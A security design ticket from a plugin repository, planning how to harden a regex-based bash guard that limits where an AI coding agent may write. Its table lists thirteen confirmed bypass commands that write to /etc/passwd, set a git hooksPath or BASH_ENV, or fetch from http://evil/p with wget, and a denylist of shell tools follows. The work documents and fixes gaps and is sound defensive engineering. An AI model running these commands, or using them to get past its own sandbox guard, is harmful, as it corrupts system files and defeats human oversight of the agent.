---
trdd-id: 899317b3-71b7-4e5f-8ee4-3e9b8d29e706
title: Strengthen directory-guard bash analyzer
column: backburner
created: 2026-05-08T00:00:00+0200
updated: 2026-06-11T11:35:00+0200
current-owner: null
task-type: security
severity: HIGH
relevant-rules: []
---

# TRDD-899317b3-71b7-4e5f-8ee4-3e9b8d29e706 — Strengthen directory-guard bash analyzer

**Filename:** `design/tasks/TRDD-899317b3-71b7-4e5f-8ee4-3e9b8d29e706-aegis-bash-analyzer-regex-gaps.md`
**Tracked in:** this repo (design/tasks/ is git-tracked)
**Source audit:** `reports/v258-pre-publish-audit/aegis-security.md` (HIGH-01)
**Severity:** HIGH (sandbox bypass)
**Status:** Not started
**Filed:** 2026-05-08

## Problem

`scripts/directory-guard.cjs:260-315` (the bash analyzer) is a regex-only
heuristic. Empirical testing confirmed 13 high-impact write vectors that
the guard does **not** detect, while still allowing the command through to
bash. Confirmed bypasses (each returned MISS in a direct test):

| # | Bypass payload                                                  | Mechanism                                                                 |
|---|-----------------------------------------------------------------|---------------------------------------------------------------------------|
| 1 | `echo h > "/etc/passwd"`                                        | redirect target wrapped in `"…"` — exclusion class drops anything in quotes |
| 2 | `echo h > '/etc/passwd'`                                        | same, single-quoted                                                       |
| 3 | `echo h >\| /etc/passwd`                                         | `>\|` (clobber-override) operator — regex only matches `>>?`               |
| 4 | `cp /tmp/x "/etc/something"`                                    | quoted destination defeats `cpMvRegex`                                    |
| 5 | `awk 'BEGIN{print "x" > "/etc/passwd"}'`                        | awk's `print > file` — no awk pattern                                     |
| 6 | `ruby -e 'File.write("/etc/passwd","x")'`                       | no ruby pattern                                                           |
| 7 | `node -e "require('fs').writeFileSync(\`/etc/passwd\`,'x')"`    | guard only matches single/double quotes — backticks defeat it             |
| 8 | `tar xf /tmp/evil.tar -C /`                                     | no tar pattern                                                            |
| 9 | `xargs rm < /tmp/list`                                          | no xargs pattern                                                          |
| 10 | `git config --global core.hooksPath /tmp/evil_hooks`           | persists arbitrary code execution on next git op                          |
| 11 | `BASH_ENV=/tmp/evil bash -c true`                              | env-var-driven script execution                                           |
| 12 | `wget http://evil/p -O/etc/passwd`                             | `-O` and the path are concatenated — regex requires whitespace            |
| 13 | `tee "/etc/passwd" < /tmp/x`                                   | quoted tee target                                                         |

Plus INFO-01: `cp -t /forbidden src` and `tee --output-error=warn /forbidden`
(GNU long-form `--target-directory`) are also not detected.

## Design options

### Option A — Quote-aware tokenizer (medium-effort, stop-gap)

Replace the regex set with a tokenizer that:

1. Strips matched quote pairs (single, double, backtick) into placeholder
   tokens before pattern-matching, then restores them when reporting
   the violating token.
2. Adds explicit denylist entries for: `BASH_ENV=`, `ENV=`, `bash -c`,
   `sh -c`, `eval `, `awk … >`, `ruby -e`, `perl -e`, `node -e`,
   `tar -x` / `tar x`, `xargs`, `git config`, `>|`, `find … -exec`,
   and any double/single-quoted destination after a redirect/cp/mv/tee/dd/install verb.
3. Adds long-form `--target-directory=` and `-t <dir>` patterns.

This is a finite, testable change. It does NOT solve the underlying
"regex-on-shell-strings is fundamentally porous" problem.

### Option B — Real shell parser (higher-effort, robust)

Adopt `bash-parser` (Node) or shell out to `mvdan/sh` (Go binary) for
actual AST-based command analysis. Pro: catches shell features the
regex set will never cover (parameter expansion, here-docs, process
substitution). Con: adds a Node dependency (or a Go binary), increases
hook latency, requires a fail-closed-on-parse-error policy.

### Option C — OS-level sandbox (long-term, principled)

Move sandbox enforcement to OS-level: `sandbox-exec` on macOS, `bwrap`
or `landlock` on Linux. The bash guard becomes "advisory" / "telemetry";
the kernel enforces write boundaries. Pro: every bypass above
becomes irrelevant. Con: requires AI Maestro server-side launcher
changes (not just plugin-side), and breaks any user who runs Claude
Code outside the AI Maestro launcher (CLI direct, IDE direct, etc.).

## Recommendation

Land Option A in v2.5.9 as a stop-gap (immediate risk reduction without
new dependencies). File a follow-up TRDD for Option C — that's the
principled fix and it lands in AI Maestro core, not this plugin.
Document Option B as rejected (latency + parse-error policy too brittle
for a synchronous PreToolUse hook with 3s timeout).

## Acceptance criteria (Option A)

- [ ] All 13 bypass payloads in the table above return DENY in unit tests
- [ ] `cp -t /forbidden src` and `tee --output-error=warn /forbidden` denied
- [ ] No false-positives on the 50+ benign commands currently in the test corpus
- [ ] Hook latency p95 < 100ms (current is ~10ms — budget allows tokenizer)
- [ ] `directory-guard.cjs` opening comment marks the bash guard as
  defense-in-depth advisory, with a note that AI Maestro launchers
  should add OS-level sandboxing for hard enforcement

## Out of scope

- Option B (real parser) — rejected
- Option C (OS sandbox) — separate TRDD owned by ai-maestro core
- Telemetry endpoint for caught bypass attempts — v2.6+
